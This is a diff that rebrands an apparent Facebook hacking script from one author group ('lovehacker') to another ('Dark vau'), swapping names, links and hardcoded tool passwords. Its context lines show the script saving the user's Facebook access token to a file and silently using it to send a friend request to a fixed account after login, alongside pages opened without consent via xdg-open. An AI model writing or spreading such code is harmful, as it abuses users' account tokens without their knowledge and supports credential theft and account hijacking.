@@ -37,18 +37,18 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
-   Asif Javed
+   Asif D1ARK-VA4U3
    ▄︻̷̿┻̿═━一
-   THE ANONYMOUS lovehacker TRICKER 
-   THE LEGEND ℒℴνℯ
-   THE GAME CHANGER ℒℴνℯ
-   pakistani hackers
-   ℒℴνℯ ▄︻̷̿┻̿═━一
+   THE ANONYMOUS The Dark vau
+   THE LEGEND
+   THE GAME CHANGER Dark vau
+   Bangladeshi hackers
+   Dark ▄︻̷̿┻̿═━一
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mPakistani Hackers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor  \033[1;93m: \033[1;92mDarkvau
+\033[1;96mYouTube \033[1;93m: \033[1;92mBangladeshi Hackers
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/D1ARK-VA4U3
+\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/dark.vau.its.official
 \033[1;91m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -66,14 +66,14 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mlovehacker
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor  \033[1;93m: \033[1;92mDarkvau
+\033[1;96mYouTube \033[1;93m: \033[1;92mDarkhacker
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/D1ARK-VA4U3
+\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/dark.vau.its.official
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
-CorrectUsername = "lovehacker"
-CorrectPassword = "03094161457"
+CorrectUsername = "Darkhacker"
+CorrectPassword = "D1ARK-VA4U3"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -84,10 +84,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://www.facebook.com/dark.vau.its.official')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://www.facebook.com/dark.vau.its.official')
 def login():
 	os.system('clear')
 	try:
@@ -127,7 +127,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				os.system('xdg-open https://www.facebook.com/dark.vau.its.official')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
